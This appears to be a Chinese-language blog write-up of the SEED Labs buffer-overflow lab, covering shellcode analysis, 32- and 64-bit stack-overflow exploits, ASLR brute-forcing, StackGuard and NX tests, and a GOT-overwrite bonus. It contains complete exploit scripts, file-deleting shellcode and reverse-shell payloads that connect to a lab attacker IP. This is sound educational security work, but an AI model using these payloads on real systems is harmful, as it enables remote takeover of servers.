---
layout: post
title: "Buffer-Overflow Attack Lab (Server Version)"
date: 2024-04-25
categories: [SEED-Labs, Software-Security]
tags: [Overflow]
---

# Buffer-Overflow Attack Lab (Server Version)

注：除bonus外都为官方task 。

# Overview

本lab的主要目的是实施缓冲区溢出攻击以及研究如何防御。

首先关闭随机化地址。

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

编译的指令如下。其中 `-z execstack` 这个 flag 可以让栈可执行。 `-fno-stack-protector` 这个flag会关闭GCC的栈保护功能，栈保护功能会检查缓冲溢出。

```bash
gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c
```

使用 `docker-compose up` 启动这些容器后，还需要用 `docker exec` 来在某个容器中起一个 shell 。可以用 `docker ps` 来查询容器的id，输入id时不需要输入完整的id，只要一部分没有二义性的前缀就可以了。

# Task 1: Get Familiar with the Shellcode

首先看一下这段64位shellcode。

```python
shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```

经过线上的反汇编工具我得到了如下的汇编代码。

```nasm
0:  eb 36                   jmp    0x38
2:  5b                      pop    ebx
3:  48                      dec    eax
4:  31 c0                   xor    eax,eax
6:  88 43 09                mov    BYTE PTR [ebx+0x9],al
9:  88 43 0c                mov    BYTE PTR [ebx+0xc],al
c:  88 43 47                mov    BYTE PTR [ebx+0x47],al
f:  48                      dec    eax
10: 89 5b 48                mov    DWORD PTR [ebx+0x48],ebx
13: 48                      dec    eax
14: 8d 4b 0a                lea    ecx,[ebx+0xa]
17: 48                      dec    eax
18: 89 4b 50                mov    DWORD PTR [ebx+0x50],ecx
1b: 48                      dec    eax
1c: 8d 4b 0d                lea    ecx,[ebx+0xd]
1f: 48                      dec    eax
20: 89 4b 58                mov    DWORD PTR [ebx+0x58],ecx
23: 48                      dec    eax
24: 89 43 60                mov    DWORD PTR [ebx+0x60],eax
27: 48                      dec    eax
28: 89 df                   mov    edi,ebx
2a: 48                      dec    eax
2b: 8d 73 48                lea    esi,[ebx+0x48]
2e: 48                      dec    eax
2f: 31 d2                   xor    edx,edx
31: 48                      dec    eax
32: 31 c0                   xor    eax,eax
34: b0 3b                   mov    al,0x3b
36: 0f 05                   syscall
38: e8 c5 ff ff ff          call   0x2
```

这段汇编的目的是执行 `execve` 系统调用，在这之前需要准备一些参数。下边是这个系统调用在Linux中的签名。

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

- `RDI` 寄存器包含 `pathname` 参数的地址。
- `RSI` 寄存器包含 `argv` 参数的地址。
- `RDX` 寄存器包含 `envp` 参数的地址。

首先跳转到 `call` 指令处然后由跳转回下一条指令 `pop` ，目的是设置 `EBX` 寄存器的值为所有字符串的首地址。然后开始准备参数，首先是将参数从’*’替换为’0’，然后把后边包含很多’A’，‘B’，‘C’和‘D’的四个字符串替换成了 `argv` 中的指针，分别指向上边上个字符串的首地址以及一个 `null` 。随后设置 `EAX` 的值为 `execve` 对应的值进行系统调用。

分析完这段shellcode之后看一下这个’call_shellcode.c’文件，这个文件把这段shellcode当成一个函数直接执行。

```c
int (*func)() = (int(*)())code;
func();
```

所以运行之后就会发现shellcode中的指令成功被执行。

这个task的任务是删除一个文件，也就是替换shellcode中的指令。首先执行 `ls` 然后用 `rm` 指令删除一个文件，然后再执行 `ls` 验证结果。shellcode如下：

```python
shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/ls -l; /bin/rm target.txt; /bin/ls -l                *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```

# Task 2: Level-1 Attack

这个task是要打一个反弹shell，看了 ‘Makefile’ 发现这个server是一个32位的程序，所以只能用32位的shellcode来打。

下边是一个反弹 shell 的指令事例。

```bash
/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
```

- `-i` 代表一个交互式的 shell，他可以从标准输入中读取字符串作为指令。
- `> /dev/tcp/10.0.2.6/9090` 把标准输出重定向到一个TCP连接上，这里和 `1>` 是等价的，因为 `1` 代表标准输出，可以省略。
- `0<&1 2>&1` 这里把标准输入和标准错误输出重定向到标准输出， `&` 不能省略，否则会被重定向到 `1` 这个文件中去。

于是构造shellcode：

```python
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/bash -i > /dev/tcp/10.9.0.1:9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```

打印发现shellcode的长度为136个byte。

通过 `nc` 指令可以得到buffer的地址为0xffff728，返回地址的地址为0xffffd798+0x4。返回地址和buffer的地址的差才116个byte，那么就说明shellcode如果放在return address前边就一定会被return address覆盖掉4个byte。所以把它放在return address后边就好了。

![Screenshot 2024-04-03 at 2.51.35 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_2.51.35_AM.png)

所以补全‘exploit.py’如下：

```python
##################################################################
# Put the shellcode somewhere in the payload
start = 128             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffd7a8     # Change this number
offset = 116            # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################
```

`start` 设置为一个大于116的数， `ret` 设置为buffer的地址加上 `start` 。 `offset` 就是返回地址的地址和buffer的地址的差，这样才能把放回地址覆盖掉。

最后利用 `cat badfile | nc 10.9.0.5 9090` 攻击成功反弹shell：

这里我突然意识到一个比较巧妙的地方，数组存放地址的方向与指令的存放顺序相同，与栈增长相反，所以我们不需要把shellcode反过来。

# Task 3: Level-2 Attack

可以看到没有返回地址的地址，所以只能猜。文档中提示说buffer size是100到300，所以把shellcode放到304以外的地方，然后把100到300中的所有地方都写上修改后的返回地址即可。

![Screenshot 2024-04-03 at 3.16.06 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_3.16.06_AM.png)

代码如下：

```python
##################################################################
# Put the shellcode somewhere in the payload
start = 304             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffd808     # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(100, 304, 4):
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################
```

# Task 4: Level-3 Attack

本lab切换为64位，文档中强调64位地址前两个byte一定是0，但是 `strcpy` 遇到0会停止。

由于我们是小端法存储，所以前两个byte实际上在buffer的后边，如果截断了之后第三个byte后边的两个byte仍然是0的话就不影响。因为我们要写的是原来的返回地址，他的前两个byte一定也是0，所以理论上我们只需要覆盖他的后6个 byte 就可以了。

这种情况下需要shellcode必须要在返回地址前边，否则就会被截断。而且除了前两个byte之外的其余byte不能是0，尤其是中间的几个。

首先看一下返回地址的地址和buffer的地址：

![Screenshot 2024-04-03 at 3.36.44 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_3.36.44_AM.png)

注意到最后一个byte是0，那这个比较容易解决，只要shellcode在buffer中有一定的偏移使得开始地址的最后一个byte不是0就好。

经过计算发现返回地址的地址和buffer相差216，而shellcode的大小仅165，在返回地址前就可以放下shellcode。

脚本如下：

```python
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 8               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00007fffffffe608 # Change this number
offset = 216            # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

# Task 5: Level-4 Attack

这个task与上一个的区别是返回地址和buffer离得很近，只有104个byte，而shellcode有165个byte。

![Screenshot 2024-04-03 at 5.10.31 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_5.10.31_PM.png)

在’stack.c’中发现，首先输入会从 `fread` 中被读入，而且 `fread` 是不会因为0而读取终止的，所以可以考虑去寻找 `fread` 读入的地址。

首先使用 `gdb` 动态调试获得了 `fread` 读入地址以及 `rbp` 和buffer的地址，然后计算得出偏移量。

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled.png)

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%201.png)

偏移量计算出来之后，只需要利用现在的 `rbp` 的值加上他与 `fread` 的目的地址的偏移量，再加上shellcode在输入中的偏移量。我用的是最极端的一个情况，shellcode紧跟着返回地址：

```python
##################################################################
# Put the shellcode somewhere in the payload
start = 112             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00007fffffffe100 + 1072 + 112 # Change this number
offset = 104            # Change this number
```

# Task 6: Experimenting with the Address Randomization

这个task需要把随机化地址重新开启，并且尝试暴力攻击32位的程序（64位会比32位复杂得多）。32位程序最多只能让19位进行随机化。

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

经过测试发现每次 `echo` 返回的地址都不同：

![Screenshot 2024-04-03 at 6.08.06 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_6.08.06_PM.png)

这道题就是运行如下脚本爆破一下就好。

```bash
#!/bin/bash
SECONDS=0
value=0
while true; do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    echo "$min minutes and $sec seconds elapsed."
    echo "The program has been running $value times so far."
    cat badfile | nc 10.9.0.5 9090
done
```

# Tasks 7: Experimenting with Other Countermeasures

## Task 7.a: Turn on the StackGuard Protection

去掉 `-fno-stack-protector` 这个 `gcc` 编译的flag之后，StackGuard就会启动，然后测试一下发现缓冲区溢出会被防御掉：

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%202.png)

## Task 7.b: Turn on the Non-executable Stack Protection

在编译的时候，默认是栈不可执行，但我们之前通过设置 `-z execstack` 来让栈可执行。

测试可以发现会触发 `segmentation fault` 。

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%203.png)

# Bonus

首先看一下动态链接的原理：

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%204.png)

GOT表是可写的，所以我们在第一次动态链接前修改GOT表中 `puts` 的表项为 `system` 表项即可。

首先在本地使用 `gdb` 得到了 `puts` 和 `system` 的偏移量0x32190。然后根据远端打印出来的 `puts` 地址计算出 `system` 地址为0x7ffff7e27410。

![Screenshot 2024-04-04 at 8.32.28 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-04_at_8.32.28_PM.png)

然后用 `objdump` 找到了 `puts` 在GOT表的表项位置为0x4034c8。

![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%205.png)

现在就可以写一个shellcode来修改这个表项为 `system` 的表项。修改好之后直接跳转到 `puts` 的执行位置，这个地址也是通过 `objdump` 来获得的。而且在这之前设置好 `rdi` 的值，通过 `objdump` 可以找到字符串的位置。

我尝试了一下跳转到其他位置，不会有任何的结果返回，我猜测是因为栈被我们堆满了垃圾，所以程序不能正常运行。

```nasm
BITS 64

mov byte [0x4034c8], 0x10
mov byte [0x4034c8 + 1], 0x74
mov byte [0x4034c8 + 2], 0xe2
mov rdi, 0x4020a0
mov rax, 0x40129c
jmp rax
```

使用 `nasm` 生成机器码写入‘exploit.py’脚本，这个脚本其余部分与上一个task5一样，利用 `fread` 开辟的内存进行攻击，偏移量略有不同，通过 `gdb` 计算一下就好。

以下是’exploit.py’：

```bash
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
    "\xc6\x04\x25\xc8\x34\x40\x00\x10"
    "\xc6\x04\x25\xc9\x34\x40\x00\x74"
    "\xc6\x04\x25\xca\x34\x40\x00\xe2"
    "\xbf\xa0\x20\x40\x00"
    "\xb8\xb7\x12\x40\x00\xff\xe0"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 128             # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00007fffffffe2b0 + 1088 + 128 # Change this number
offset = 120            # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```